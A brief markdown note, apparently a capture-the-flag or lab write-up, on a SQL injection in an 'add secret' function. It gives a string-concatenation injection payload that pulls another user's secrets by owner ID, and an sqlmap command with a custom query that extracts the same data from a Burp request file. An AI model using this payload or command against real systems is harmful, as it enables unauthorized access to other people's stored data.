```md

`' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '`

SQL injection in the add secret function

Automated,

` sqlmap -r req.txt --threads=10 --batch --sql-query="SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb'" `

req.txt is the request file (copy paste from burp) --batch just for autoinputs and the query can be derived from the source files given
